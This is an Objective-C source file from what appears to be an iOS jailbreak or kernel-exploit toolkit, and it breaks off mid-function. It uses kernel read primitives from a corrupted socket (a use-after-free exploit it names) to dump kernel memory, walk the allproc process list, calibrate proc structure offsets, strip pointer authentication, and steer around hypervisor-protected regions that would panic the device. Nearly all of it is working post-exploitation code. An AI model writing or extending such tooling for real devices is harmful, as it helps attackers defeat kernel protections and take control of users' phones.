#import "KPDump.h"
#import "KPLog.h"

#import <errno.h>
#import <pthread.h>
#import <stdatomic.h>
#import <string.h>
#import <sys/mman.h>
#import <sys/utsname.h>
#import <sys/wait.h>
#import <unistd.h>
#import <UIKit/UIKit.h>
#import <QuartzCore/QuartzCore.h>

#import <mach/mach_error.h>
#import <IOKit/IOKitLib.h>
#import <Metal/Metal.h>
#import <os/log.h>
#import <ImageIO/ImageIO.h>
// В SDK есть (этот же хедер импортирует exploit/kexploit_opa334.m):
// IOSurfaceCreate/IOSurfaceGetID + ключи kIOSurface* для M2Scaler UAF-рига.
#import <IOSurface/IOSurfaceRef.h>

// In IOKit on device but not declared in the theos SDK headers we ship.
extern kern_return_t IORegistryEntryGetRegistryEntryID(io_registry_entry_t entry, uint64_t *entryID);

// mach_vm.h is "unsupported" in the iOS SDK, but the routines live in
// libSystem. Declare them; used by E10's launchd read-back verification.
#include <mach/kern_return.h>
#include <mach/machine.h>
#include <mach/port.h>
extern kern_return_t mach_vm_region(vm_map_read_t target_task, mach_vm_address_t *address, mach_vm_size_t *size, vm_region_flavor_t flavor, vm_region_info_t info, mach_msg_type_number_t *infoCnt, mach_port_t *object_name);
extern kern_return_t mach_vm_read(vm_map_read_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);
extern kern_return_t mach_vm_deallocate(vm_map_read_t target_task, mach_vm_address_t address, mach_vm_size_t size);

#import <libjailbreak/info.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/translation.h>

#import "exploit/kexploit_opa334.h" // darksword_*_socket_pcb() (corrupted inpcb VAs) for the zone route
#import "exploit/kutils.h"          // proc_self() — direct own-proc VA, no allproc walk
#import "exploit/offsets.h"         // off_proc_ro_pr_task / off_task_map

static BOOL kpLooksLikeKernelPointer(uint64_t v)
{
    return (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL;
}

static void kpNote(NSMutableString *report, NSString *line)
{
    [[KPLog shared] append:line];
    if (report) [report appendFormat:@"%@\n", line];
}

// The EL2 domain faults in the physical aperture when read via the socket
// primitive — PANIC. 1.9.6: the old "whole 01..02 band minus kernel image"
// guard also blocked the libsptm PAPT table, which lives in ordinary EL1
// kernel map (0xfffffff011…/0x013…/0x029… across boots) and is read by the
// kernel from EL1 in 123 places. Block exactly the SPTM/TXM image spans
// (bases from the EXP-02 formula) and nothing else.
static BOOL kpVAIsEL2Domain(uint64_t addr)
{
    uint64_t sptm = gSystemInfo.kernelConstant.sptmBase;
    if (sptm && addr >= sptm && addr < sptm + 0xF4000ULL) return YES;
    uint64_t txm = gSystemInfo.kernelConstant.txmBase;
    if (txm && addr >= txm && addr < txm + 0x64000ULL) return YES;
    // Fallback before the bases are derived: only the bare 01/02 band minus
    // the kernel image (the pre-formula behaviour).
    if (!sptm && !txm) {
        BOOL inBand = addr >= 0xfffffff010000000ULL && addr < 0xfffffff030000000ULL;
        if (!inBand) return NO;
        uint64_t kb = kconstant(base);
        if (kb && addr >= kb && addr < kb + 0x5000000ULL) return NO;
        return YES;
    }
    return NO;
}

// 1.7.3: forward decls — the unmapped-read gate in kpRead uses the ttep
// globals that are defined below (they back kpWalkCandidateHead too).
static uint64_t gCpuTtepVA;
static uint64_t gCpuTtepPhys;

// Read kernel memory. Universal per field data; the only forbidden range is
// the EL2 SPTM/TXM image domain (panic on read).
static BOOL kpRead(uint64_t addr, void *out, size_t size, const char *what, NSMutableString *report)
{
    if (!addr) {
        kpNote(report, [NSString stringWithFormat:@"  %-32s пропуск: ключ не найден в словаре оффсетов", what]);
        return NO;
    }
    if (kpVAIsEL2Domain(addr)) {
        kpNote(report, [NSString stringWithFormat:@"  %-32s VA 0x%llx в EL2-домене (SPTM/TXM) — чтение = паника, пропуск", what, addr]);
        return NO;
    }
    // 1.7.3: unmapped-read gate. EXP-02's pointer-vote chased a garbage pointee
    // to base+0xad5f40 — an unmapped hole just past the kernel image — and the
    // kernel-side read panicked ("Unexpected fault in kernel physical
    // aperture", FAR=that VA). With translation up, prove both ends of the
    // range are backed before reading. Costs 2 page-table walks per read; a
    // dead read costs a reboot.
    // 1.9.5: but NOT inside the kernel image itself — the image is always
    // mapped, and the gate was false-refusing kernel statics
    // (libsptm_frame_table, SPTMArgs) on this boot.
    uint64_t kb = kconstant(base);
    BOOL inKernelImage = kb && addr >= kb && addr + size <= kb + 0x5000000ULL;
    if (!inKernelImage && (gCpuTtepVA || gCpuTtepPhys)) {
        if (kvtophys(addr) == 0 || kvtophys(addr + size - 1) == 0) {
            kpNote(report, [NSString stringWithFormat:@"  %-32s VA 0x%llx незамаплен (kvtophys=0) — пропуск", what, addr]);
            return NO;
        }
    }
    memset(out, 0, size);
    kreadbuf(addr, out, size);
    return YES;
}

static void kpAppendHexDump(NSMutableString *out, uint64_t baseAddr, const void *data, size_t size)
{
    const uint8_t *bytes = (const uint8_t *)data;
    for (size_t i = 0; i < size; i += 16) {
        NSMutableString *hex = [NSMutableString string];
        NSMutableString *asc = [NSMutableString string];
        for (size_t j = i; j < i + 16 && j < size; j++) {
            [hex appendFormat:@"%02x ", bytes[j]];
            [asc appendFormat:@"%c", (bytes[j] >= 0x20 && bytes[j] <= 0x7e) ? bytes[j] : '.'];
        }
        while (hex.length < 16 * 3) [hex appendString:@"   "];
        [out appendFormat:@"    0x%016llx: %@| %@\n", baseAddr + i, hex, asc];
    }
}

// Guarded hexdump of a region. Returns YES when the read happened.
static BOOL kpDumpRegion(NSMutableString *report, const char *what, uint64_t addr, size_t size)
{
    if (!addr) {
        kpNote(report, [NSString stringWithFormat:@"  %-32s пропуск: ключ не найден в словаре оффсетов", what]);
        return NO;
    }
    void *buf = malloc(size);
    if (!kpRead(addr, buf, size, what, report)) {
        free(buf);
        return NO;
    }
    NSMutableString *hex = [NSMutableString string];
    kpAppendHexDump(hex, addr, buf, size);
    [[KPLog shared] append:hex];
    if (report) [report appendString:hex];
    free(buf);
    return YES;
}

// Guarded u64 read; value goes to *out (untouched on failure).
static BOOL kpReadU64(const char *what, uint64_t addr, uint64_t *out, NSMutableString *report)
{
    uint64_t v = 0;
    if (!kpRead(addr, &v, sizeof(v), what, report)) return NO;
    kpNote(report, [NSString stringWithFormat:@"  %-32s = 0x%016llx", what, v]);
    *out = v;
    return YES;
}

// VA/PA forms of the tagged cpu_ttep value (set by initializeBootConstantsGuarded;
// the survey's translation self-check picks the mode that actually walks).
static uint64_t gCpuTtepVA = 0;
static uint64_t gCpuTtepPhys = 0;

@interface KPM2ScalerTrigger : NSObject
@property (nonatomic, strong) UIView *view;
@property (nonatomic, strong) CADisplayLink *link;
@property (nonatomic, assign) IOSurfaceRef surface;
@property (nonatomic, assign) uint32_t frame;
- (void)startWithSurface:(IOSurfaceRef)surface;
- (void)stop;
@end

@implementation KPDump

// Walk allproc by comm name via the fast pid-walk path (ksymbol(allproc),
// 2 reads/node — the one that found launchd), reading p_name @ off_proc_p_name
// (0x57d on 18.6) instead of gCommOff (which needs a dead gAllprocHead).
+ (uint64_t)findProcByCommName:(const char *)name log:(NSMutableString *)r
{
    uint64_t sym = ksymbol(allproc);
    if (!sym) { kpNote(r, @"  allproc: ключ не найден — пропуск"); return 0; }
    uint64_t head = 0;
    if (!kpRead(sym, &head, sizeof(head), "allproc head", r)) return 0;
    head = kp_untag_ptr(head);
    if (!kpLooksLikeKernelPointer(head)) return 0;
    size_t len = strlen(name);
    if (len > 15) len = 15; // p_name is bounded
    uint64_t node = head, prev = 0;
    for (int n = 0; n < 1536; n++) {
        if (!kpLooksLikeKernelPointer(node) || node == prev) {
            if (n) kpNote(r, [NSString stringWithFormat:@"  цепь оборвалась на узле %d", n]);
            break;
        }
        char pname[17] = {0};
        kreadbuf(node + off_proc_p_name, pname, 16);
        pname[16] = 0;
        if (pname[0] && memcmp(pname, name, len) == 0) {
            kpNote(r, [NSString stringWithFormat:@"  процесс \"%s\" (p_name=\"%s\") @ %#llx (узлов=%d)", name, pname, node, n]);
            return node;
        }
        uint64_t next = 0;
        kreadbuf(node, &next, sizeof(next));
        prev = node;
        node = kp_untag_ptr(next);
        if ((n & 0xFF) == 0xFF) kpNote(r, [NSString stringWithFormat:@"  …fast walk: %d узлов, ищем \"%s\"", n + 1, name]);
    }
    kpNote(r, [NSString stringWithFormat:@"  процесс \"%s\" не найден fast walk'ом", name]);
    return 0;
}

+ (void)initializeBootConstantsGuarded
{
    NSMutableString *scratch = [NSMutableString string];

    gSystemInfo.kernelConstant.base = kconstant(staticBase) + gSystemInfo.kernelConstant.slide;

    // 18.6: these globals hold PAC-tagged values. Strip with kp_untag_ptr and
    // store only when the stripped result is sane. cpu_ttep is special: it is
    // a TTBR value (ASID in bits 63:48, phys base in 47:0) — its phys part is
    // masked WITHOUT sign extension. The VA-form strip is kept separately for
    // the VA-mode translation self-check in the survey.
    uint64_t v = 0;
    if (kpRead(ksymbol(gVirtBase), &v, sizeof(v), "gVirtBase", scratch)) {
        uint64_t s = kp_untag_ptr(v);
        BOOL sane = kpLooksLikeKernelPointer(s);
        if (sane) gSystemInfo.kernelConstant.virtBase = s;
        [[KPLog shared] appendFormat:@"  gVirtBase: raw=0x%016llx strip=0x%016llx%s",
            (unsigned long long)v, (unsigned long long)s, sane ? "" : "  (не похож — не сохраняю)"];
    }
    v = 0;
    if (kpRead(ksymbol(gPhysBase), &v, sizeof(v), "gPhysBase", scratch)) {
        uint64_t s = kp_untag_ptr(v);
        // 1.5.5: physBase is a PHYSICAL address — the kernel-VA mask used
        // before rejected the real A17 value (0x10002af0000: DRAM aperture
        // above 4GB, 16K-aligned) and left physBase=0, breaking the phystokv
        // fallback. Validate it as a physical address instead.
        BOOL sane = (s != 0 && (s & 0x3fffULL) == 0 && s <= 0x40000000000ULL);
        if (sane) gSystemInfo.kernelConstant.physBase = s;
        [[KPLog shared] appendFormat:@"  gPhysBase: raw=0x%016llx strip=0x%016llx%s",
            (unsigned long long)v, (unsigned long long)s, sane ? "" : "  (не похож — не сохраняю)"];
    }
    v = 0;
    if (kpRead(ksymbol(gPhysSize), &v, sizeof(v), "gPhysSize", scratch)) {
        uint64_t s = kp_untag_ptr(v);
        BOOL sane = (s != 0 && s <= 0x400000000ULL); // ≤16 GiB
        if (sane) gSystemInfo.kernelConstant.physSize = s;
        [[KPLog shared] appendFormat:@"  gPhysSize: raw=0x%016llx strip=0x%016llx%s",
            (unsigned long long)v, (unsigned long long)s, sane ? "" : "  (не размер — не сохраняю)"];
    }
    v = 0;
    if (kpRead(ksymbol(cpu_ttep), &v, sizeof(v), "cpu_ttep", scratch)) {
        // TTBR: ASID in bits 63:48, phys base in 47:0 (mask only, no sign ext).
        uint64_t ttbrPhys = v & 0x0000ffffffffffffULL;
        uint64_t vaForm = kp_untag_ptr(v);
        gCpuTtepVA = vaForm;
        gCpuTtepPhys = ttbrPhys;
        gSystemInfo.kernelConstant.cpuTTEP = ttbrPhys;
        [[KPLog shared] appendFormat:@"  cpu_ttep: raw=0x%016llx ttbr-phys=0x%016llx va-формой=0x%016llx",
            (unsigned long long)v, (unsigned long long)ttbrPhys, (unsigned long long)vaForm];
    }

    // EXP-02: SPTM/TXM runtime bases — DEBG fast path, then pointer-vote.
    [self harvestSptmTxmBasesWithLog:scratch];

    [[KPLog shared] appendFormat:@"  base=%#llx virtBase=%#llx physBase=%#llx physSize=%#llx cpuTTEP=%#llx sptmBase=%#llx sptmSlide=%#llx txmBase=%#llx txmSlide=%#llx",
        kconstant(base), kconstant(virtBase), kconstant(physBase), kconstant(physSize),
        kconstant(cpuTTEP), kconstant(sptmBase), kconstant(sptmSlide), kconstant(txmBase), kconstant(txmSlide)];
}

#pragma mark - EXP-01: fixed allproc (multi-route, verified per hop)

static uint64_t gAllprocHead = 0;
static uint32_t gCommOff = 0;
static uint32_t gPidOff = 0;
static uint64_t gSelfProcVA = 0;

// A node holds a comm string when its window contains it as a C-string.
static BOOL kpNodeHasComm(const uint8_t *window, size_t size, const char *comm, uint32_t *offOut)
{
    size_t clen = strlen(comm) + 1;
    for (size_t i = 0; i + clen <= size; i++) {
        if (memcmp(window + i, comm, clen) == 0) {
            *offOut = (uint32_t)i;
            return YES;
        }
    }
    return NO;
}

// Walk a candidate list head (p_list links at proc+0/+8, per the ladder).
// Returns the VA of the node whose window holds "kernel_task", or 0. Every
// hop is PAC-stripped and sanity-checked before following.
static uint64_t kpWalkCandidateHead(uint64_t head, NSMutableString *r, uint32_t *commOffOut)
{
    if (!kpLooksLikeKernelPointer(head)) return 0;
    uint64_t node = head, prev = 0;
    for (int n = 0; n < 64 && kpLooksLikeKernelPointer(node) && node != prev; n++) {
        // 1.4.3: a garbage-but-in-range head fed the walk into unmapped memory
        // and panicked the kernel at candidate #68 (previous run). Prove the
        // node is backed by a physical page before any read; a dead link ends
        // the walk quietly instead of panicking.
        if ((gCpuTtepVA || gCpuTtepPhys) && kvtophys(node) == 0) return 0;
        uint8_t window[0x400];
        memset(window, 0, sizeof(window));
        // 1.5.4: the gate above proved only the FIRST page. The 0x400 window
        // crosses the 16K page end for nodes past page offset 0x3c00 —
        // candidate #65 (head 0xffffffe267fdbd60, page offset 0x3d60) read
        // 0x160 bytes into an unmapped physmap page and panicked the kernel
        // inside getsockopt. Prove the last byte too, else clamp the window
        // to the 16K page end.
        size_t winSize = sizeof(window);
        if ((gCpuTtepVA || gCpuTtepPhys) && kvtophys(node + winSize - 1) == 0) {
            uint64_t pageEnd = (node & ~0x3fffULL) + 0x4000;
            winSize = (size_t)(pageEnd - node);
        }
        if (!kpRead(node, window, winSize, "list node", r)) return 0;
        // Back-link validation: node's le_prev must address prev's le_next —
        // for proc, le_next is at offset 0, so le_prev == prev exactly.
        if (n > 0) {
            uint64_t backRaw = 0;
            memcpy(&backRaw, window + koffsetof(proc, list_prev), sizeof(backRaw));
            if (kp_untag_ptr(backRaw) != prev) return 0;
        }
        uint32_t off = 0;
        if (kpNodeHasComm(window, sizeof(window), "kernel_task", &off)) {
            *commOffOut = off;
            return node;
        }
        uint64_t nextRaw = 0;
        memcpy(&nextRaw, window + koffsetof(proc, list_next), sizeof(nextRaw));
        prev = node;
        node = kp_untag_ptr(nextRaw);
    }
    return 0;
}

// Calibrate p_pid using the three known pids: kernel_task=0, launchd=1,
// ourselves=getpid(). Finds the 4-aligned offset matching all three; prefers
// the ladder value (0x60 on 18.6). No offset is trusted a priori.
+ (void)calibratePidOffset:(NSMutableString *)r
{
    if (!gAllprocHead || !gCommOff) return;

    const char *myName = getprogname();
    uint64_t ktVA = 0, launchdVA = 0, selfVA = 0;
    uint64_t node = gAllprocHead, prev = 0;
    for (int n = 0; n < 512 && kpLooksLikeKernelPointer(node) && node != prev && (!ktVA || !launchdVA || !selfVA); n++) {
        uint8_t window[0x400];
        memset(window, 0, sizeof(window));
        // 1.5.4: same page-tail rule as the candidate walk — clamp the read
        // window when the 16K page behind the node is unmapped.
        size_t winSize = sizeof(window);
        if ((gCpuTtepVA || gCpuTtepPhys)) {
            if (kvtophys(node) == 0) break;
            if (kvtophys(node + winSize - 1) == 0) {
                uint64_t pageEnd = (node & ~0x3fffULL) + 0x4000;
                winSize = (size_t)(pageEnd - node);
            }
        }
        if (!kpRead(node, window, winSize, "calib node", r)) break;
        uint32_t dummy = 0;
        if (!ktVA && kpNodeHasComm(window, sizeof(window), "kernel_task", &dummy)) ktVA = node;
        if (!launchdVA && gCommOff && gCommOff + 32 <= winSize &&
            memcmp(window + gCommOff, "launchd", 8) == 0) launchdVA = node;
        if (!selfVA && gCommOff && gCommOff + strlen(myName) + 1 <= winSize &&
            memcmp(window + gCommOff, myName, strlen(myName) + 1) == 0) selfVA = node;
        uint64_t nextRaw = 0;
        memcpy(&nextRaw, window + koffsetof(proc, list_next), sizeof(nextRaw));
        prev = node;
        node = kp_untag_ptr(nextRaw);
        if ((n & 0x3F) == 0x3F) kpNote(r, [NSString stringWithFormat:@"  калибровка pid: обошли %d узлов…", n + 1]);
    }
    kpNote(r, [NSString stringWithFormat:@"  калибровка: kernel_task=%#llx launchd=%#llx self=%#llx",
              (unsigned long long)ktVA, (unsigned long long)launchdVA, (unsigned long long)selfVA]);
    if (!ktVA || !launchdVA) {
        kpNote(r, @"  калибровка pid: не нашли kernel_task/launchd — остаёмся на оффсете лестницы");
        gPidOff = koffsetof(proc, pid);
        return;
    }

    // Solve: kt[off]==0 && launchd[off]==1 (&& self[off]==getpid() when found)
    uint32_t ladder = koffsetof(proc, pid);
    NSMutableArray<NSNumber *> *matches = [NSMutableArray array];
    for (uint32_t off = 0; off + 4 <= 0x400; off += 4) {
        uint32_t v0 = 0, v1 = 0, vSelf = 0;
        uint8_t tmp[4];
        if (!kpRead(ktVA + off, tmp, 4, "calib read", r)) break;      v0 = *(uint32_t *)tmp;
        if (v0 != 0) continue;
        if (!kpRead(launchdVA + off, tmp, 4, "calib read", r)) break; v1 = *(uint32_t *)tmp;
        if (v1 != 1) continue;
        if (selfVA) {
            if (!kpRead(selfVA + off, tmp, 4, "calib read", r)) break; vSelf = *(uint32_t *)tmp;
            if (vSelf != (uint32_t)getpid()) continue;
        }
        [matches addObject:@(off)];
    }
    if (matches.count == 0) {
        kpNote(r, @"  калибровка pid: ни один оффсет не сошёлся — лестница (0x60) под вопросом");
        gPidOff = ladder;
        return;
    }
    BOOL ladderOK = [matches containsObject:@(ladder)];
    gPidOff = ladderOK ? ladder : matches.firstObject.unsignedIntValue;
    kpNote(r, [NSString stringWithFormat:@"  p_pid оффсеты-кандидаты: %@%s; выбран 0x%x",
              [matches componentsJoinedByString:@","], ladderOK ? " (лестница среди них)" : " (лестницы НЕТ среди них)", gPidOff]);
}

// Walk the fixed chain matching our own comm — independent of p_pid.
+ (uint64_t)findSelfProcByComm:(NSMutableString *)r
{
    if (gSelfProcVA) return gSelfProcVA;
    if (!gAllprocHead || !gCommOff) return 0;
    const char *myName = getprogname();
    size_t myLen = strlen(myName) + 1;
    uint64_t node = gAllprocHead, prev = 0;
    for (int n = 0; n < 512 && kpLooksLikeKernelPointer(node) && node != prev; n++) {
        uint8_t window[0x400];
        memset(window, 0, sizeof(window));
        // 1.5.4: page-tail clamp, same as the candidate walk.
        size_t winSize = sizeof(window);
        if ((gCpuTtepVA || gCpuTtepPhys)) {
            if (kvtophys(node) == 0) return 0;
            if (kvtophys(node + winSize - 1) == 0) {
                uint64_t pageEnd = (node & ~0x3fffULL) + 0x4000;
                winSize = (size_t)(pageEnd - node);
            }
        }
        if (!kpRead(node, window, winSize, "self scan", r)) return 0;
        if (gCommOff + myLen <= winSize && memcmp(window + gCommOff, myName, myLen) == 0) {
            gSelfProcVA = node;
            kpNote(r, [NSString stringWithFormat:@"  наш proc по comm: %#llx (pid=%d)", node, getpid()]);
            return node;
        }
        uint64_t nextRaw = 0;
        memcpy(&nextRaw, window + koffsetof(proc, list_next), sizeof(nextRaw));
        prev = node;
        node = kp_untag_ptr(nextRaw);
        if ((n & 0x3F) == 0x3F) kpNote(r, [NSString stringWithFormat:@"  …обошли %d узлов, ищем \"%s\"", n + 1, myName]);
    }
    kpNote(r, @"  наш proc по comm не найден");
    return 0;
}

+ (uint64_t)resolveAllprocHeadWithLog:(NSMutableString *)r
{
    if (gAllprocHead) return gAllprocHead;
    uint64_t sym = ksymbol(allproc);
    if (!sym) {
        kpNote(r, @"  allproc: ключ не найден в словаре оффсетов — пропуск");
        return 0;
    }

    // Candidate list heads (runtime VAs), most likely first:
    //  A/B: the XPF anchor pair. Field result on 18.6: both read 0. Static
    //       analysis shows that pair takes inserts of a proc+0x6a0-pointed
    //       object — i.e. it is the pgrp/session list, NOT allproc.
    //  C/D: an alternate adjacent LIST_HEAD pair from static analysis of this
    //       exact kernelcache (proc-code region, +0/+8 links).
    // 1.5.2: ordered set — walk each head once, ever.
    // 1.5.7: the ±0x200 drift scan is DEAD. Three runs, ~230 candidate walks,
    // zero kernel_task hits — the XPF allproc anchor is wrong on 18.6, and
    // every garbage walk burns thousands of kreads through the corrupted
    // inpcb until a zone bound check panics the kernel (panics at candidates
    // #65/#94, zalloc.c:1308/829). 4 static candidates, then straight to the
    // zone route, which starts from OUR OWN proc — a real object.
    NSMutableOrderedSet<NSNumber *> *cands = [NSMutableOrderedSet orderedSet];
    if (kconstant(slide)) {
        [cands addObject:@(kconstant(slide) + 0xfffffff00aaded50ULL)];
        [cands addObject:@(kconstant(slide) + 0xfffffff00aaded58ULL)];
    }
    [cands addObject:@(sym)];
    [cands addObject:@(sym + 8)];

    const char *names[] = { "C (static 0xaaded50)", "D (static 0xaaded58)" };
    int idx = 0;
    for (NSNumber *candAddr in cands) {
        uint64_t headAddr = candAddr.unsignedLongLongValue;
        uint64_t raw = 0;
        if (!kpRead(headAddr, &raw, sizeof(raw), "head candidate", r)) { idx++; continue; }
        if (!raw) { idx++; continue; }
        uint64_t head = kp_untag_ptr(raw);
        if (!kpLooksLikeKernelPointer(head)) { idx++; continue; }
        kpNote(r, [NSString stringWithFormat:@"  кандидат #%d @ %#llx: head=0x%016llx — идём по цепочке",
                  idx, (unsigned long long)headAddr, (unsigned long long)head]);
        uint32_t commOff = 0;
        uint64_t ktNode = kpWalkCandidateHead(head, r, &commOff);
        if (ktNode) {
            gAllprocHead = head;
            gCommOff = commOff;
            const char *tag = idx < 2 ? names[idx] : (idx == 2 ? "A (XPF 0xaaa2608)" : (idx == 3 ? "B (XPF 0xaaa2610)" : "E (drift)"));
            kpNote(r, [NSString stringWithFormat:@"  EXP-01: allproc = голова %s @ %#llx; kernel_task @ %#llx; p_comm=+0x%x",
                      tag, (unsigned long long)headAddr, (unsigned long long)ktNode, gCommOff]);
            [self calibratePidOffset:r];
            return gAllprocHead;
        }
        idx++;
    }
    kpNote(r, @"  EXP-01: кандидаты исчерпаны — перехожу к zone-маршруту");

    // Zone route gives us OUR proc. From it, walk BACKWARD via le_prev (+8):
    // each element's le_prev is the previous element's VA (le_next lives at
    // offset 0); the first element's le_prev points at the head global in
    // __DATA (kernel image region). That recovers the allproc head itself.
    uint64_t selfProc = [self zoneRouteSelfProcWithLog:r];
    if (!selfProc) {
        kpNote(r, @"  EXP-01: zone-маршрут не дал proc — allproc недоступен");
        return 0;
    }
    gSelfProcVA = selfProc;

    uint64_t node = selfProc, prev = 0;
    for (int n = 0; n < 512 && kpLooksLikeKernelPointer(node) && node != prev; n++) {
        uint64_t prevRaw = 0;
        if (!kpRead(node + koffsetof(proc, list_prev), &prevRaw, sizeof(prevRaw), "le_prev", r)) break;
        uint64_t prevp = kp_untag_ptr(prevRaw);
        if (prevp >= kconstant(base) && prevp < kconstant(base) + 0x30000000ULL) {
            // head-global candidate: its value is the first element
            uint64_t firstElRaw = 0;
            if (kpRead(prevp, &firstElRaw, sizeof(firstElRaw), "head.lh_first", r)) {
                uint64_t firstEl = kp_untag_ptr(firstElRaw);
                if (kpLooksLikeKernelPointer(firstEl)) {
                    uint32_t commOff = gCommOff;
                    uint64_t ktNode = kpWalkCandidateHead(firstEl, r, &commOff);
                    if (ktNode) {
                        gAllprocHead = firstEl;
                        gCommOff = commOff;
                        kpNote(r, [NSString stringWithFormat:@"  EXP-01: allproc head восстановлен @ %#llx (zone-маршрут), kernel_task @ %#llx",
                                  (unsigned long long)prevp, (unsigned long long)ktNode]);
                        [self calibratePidOffset:r];
                        return gAllprocHead;
                    }
                }
            }
        }
        prev = node;
        node = prevp;
        if ((n & 0x3F) == 0x3F) kpNote(r, [NSString stringWithFormat:@"  …назад по цепочке: %d узлов", n + 1]);
    }
    kpNote(r, @"  EXP-01: наш proc есть, но голова списка не восстановлена — дамп ограничен");
    return 0;
}

// Walk the fixed allproc chain to a pid. Small windows for speed; progress
// logged every 64 nodes. Returns the proc VA or 0.
+ (uint64_t)findProcByPid:(uint32_t)pid log:(NSMutableString *)r
{
    uint64_t head = [self resolveAllprocHeadWithLog:r];
    if (!head) return 0;
    uint32_t pidOff = gPidOff ? gPidOff : koffsetof(proc, pid);

    uint64_t node = head, prev = 0;
    for (int n = 0; n < 512 && kpLooksLikeKernelPointer(node) && node != prev; n++) {
        uint8_t window[0x100];
        memset(window, 0, sizeof(window));
        if (!kpRead(node, window, sizeof(window), "proc scan", r)) return 0;
        uint32_t nodePid = 0;
        memcpy(&nodePid, window + pidOff, sizeof(nodePid));
        if (nodePid == pid) {
            char comm[33] = {0};
            if (gCommOff) {
                uint8_t full[0x400];
                memset(full, 0, sizeof(full));
                if (kpRead(node, full, sizeof(full), "proc full", r)) {
                    memcpy(comm, full + gCommOff, 32);
                }
            }
            kpNote(r, [NSString stringWithFormat:@"  найден proc pid=%u @ %#llx comm=\"%s\"", pid, node, comm]);
            return node;
        }
        if ((n & 0x3F) == 0x3F) {
            kpNote(r, [NSString stringWithFormat:@"  …обошли %d процессов, ищем pid %u", n + 1, pid]);
        }
        uint64_t nextRaw = 0;
        memcpy(&nextRaw, window + koffsetof(proc, list_next), sizeof(nextRaw));
        prev = node;
        node = kp_untag_ptr(nextRaw);
    }
    kpNote(r, [NSString stringWithFormat:@"  pid %u не найден в allproc", pid]);
    return 0;
}

// 1.9.1: fast pid-walk. The zone guard kills LONG walks because every kpRead
// is ~6-8 primitive calls on the corrupted socket pair (kvtophys gates) and
// every 0x100 window is 8 chunk-reads on top — a 512-node walk was thousands
// of zone ops. Here: one gated head read, then 2 direct field reads per node
// (pid @ +0x60, le_next @ +0). The chain is live zone memory; sanity is the
// kernel-pointer check + prev-node loop guard.
// E10 (field data): launchd (pid 1) sits at the TAIL of allproc — fork
// inserts at head, so the newest proc (us) is node 0 and pid 1 is several
// hundred nodes deep. Cap raised 256 → 2048 to reach the tail; progress is
// logged every 256 nodes; a >1900-consecutive-nodes-without-find fuse breaks
// just short of the cap (fast walk is safe — 2 raw reads per node on a live
// chain, no zone-route gates); a broken chain (garbage next / loop) is
// logged, not followed.
#define KP_FAST_WALK_MAX_NODES   2048
#define KP_FAST_WALK_NOFIND_FUSE 1900
+ (uint64_t)findSelfProcByPidFast:(uint32_t)pid log:(NSMutableString *)r
{
    uint64_t sym = ksymbol(allproc);
    if (!sym) return 0;
    uint64_t head = 0;
    if (!kpRead(sym, &head, sizeof(head), "allproc head", r)) return 0;
    head = kp_untag_ptr(head);
    if (!kpLooksLikeKernelPointer(head)) return 0;
    uint32_t pidOff = gPidOff ? gPidOff : koffsetof(proc, pid);
    uint64_t node = head, prev = 0;
    for (int n = 0; n < KP_FAST_WALK_MAX_NODES; n++) {
        if (!kpLooksLikeKernelPointer(node) || node == prev) {
            kpNote(r, [NSString stringWithFormat:@"  …fast walk: цепь оборвалась на узле %d (pid %u не найден)", n, pid]);
            return 0;
        }
        uint32_t nodePid = 0;
        kreadbuf(node + pidOff, &nodePid, sizeof(nodePid));
        if (nodePid == pid) {
            kpNote(r, [NSString stringWithFormat:@"  наш proc по pid %u @ %#llx (fast walk, узлов=%d)", pid, node, n]);
            return node;
        }
        if ((n & 0xFF) == 0xFF) {
            kpNote(r, [NSString stringWithFormat:@"  …fast walk: %d узлов, ищем pid %u", n + 1, pid]);
        }
        if (n >= KP_FAST_WALK_NOFIND_FUSE) {
            kpNote(r, [NSString stringWithFormat:@"  …fast walk: %d узлов подряд без находки (pid %u) — досрочный break, ядро важнее", n + 1, pid]);
            return 0;
        }
        uint64_t next = 0;
        kreadbuf(node, &next, sizeof(next));
        prev = node;
        node = kp_untag_ptr(next);
    }
    kpNote(r, [NSString stringWithFormat:@"  …fast walk: лимит %d узлов исчерпан, pid %u не найден", KP_FAST_WALK_MAX_NODES, pid]);
    return 0;
}

#pragma mark - EXP-01 fallback: zone-name route to our proc

// Verify an inpcb VA belongs to us: our process name sits in inp_last_comm
// (the exploit used the same oracle to corrupt this socket).
static BOOL kpInpcbLooksOurs(uint64_t inpcbVA, NSMutableString *r)
{
    uint8_t win[0x400];
    memset(win, 0, sizeof(win));
    if (!kpRead(inpcbVA, win, sizeof(win), "inpcb window", r)) return NO;
    const char *me = getprogname();
    BOOL found = NO;
    size_t myLen = strlen(me) + 1;
    for (size_t i = 0; i + myLen <= sizeof(win); i++) {
        if (memcmp(win + i, me, myLen) == 0) { found = YES; break; }
    }
    kpNote(r, [NSString stringWithFormat:@"  inpcb %#llx содержит наш comm: %s",
              (unsigned long long)inpcbVA, found ? "да" : "НЕТ"]);
    return found;
}

// Zone route: inpcb → pcbinfo → zone("inpcb") → calibrate z_name → scan for
// zone "proc" → walk its page queue → find our proc by comm → validate via
// the proc_ro→ucred→cr_uid == getuid() hop. Fully content-calibrated; no
// zone/proc offsets are trusted a priori.
+ (uint64_t)zoneRouteSelfProcWithLog:(NSMutableString *)r
{
    kpNote(r, @"  EXP-01 fallback: zone-маршрут (inpcb → зона «inpcb» → зона «proc» → наш proc)");
    uint64_t inpcbVA = darksword_control_socket_pcb() ? darksword_control_socket_pcb() : darksword_rw_socket_pcb();
    if (!inpcbVA) {
        kpNote(r, @"  нет pcb адреса в контексте эксплойта — выход");
        return 0;
    }
    if (!kpInpcbLooksOurs(inpcbVA, r)) {
        kpNote(r, @"  inpcb без нашего comm — маршрут не доверен, выход");
        return 0;
    }

    uint64_t raw = 0;
    if (!kpRead(inpcbVA + koffsetof(inpcb, pcbinfo), &raw, sizeof(raw), "inpcb.pcbinfo", r)) return 0;
    uint64_t pcbinfo = kp_untag_ptr(raw);
    kpNote(r, [NSString stringWithFormat:@"  pcbinfo: raw=0x%016llx → 0x%016llx", (unsigned long long)raw, (unsigned long long)pcbinfo]);
    if (!kpLooksLikeKernelPointer(pcbinfo)) return 0;

    raw = 0;
    if (!kpRead(pcbinfo + koffsetof(inpcbinfo, ipi_zone), &raw, sizeof(raw), "inpcbinfo.ipi_zone", r)) return 0;
    uint64_t zoneInpcb = kp_untag_ptr(raw);
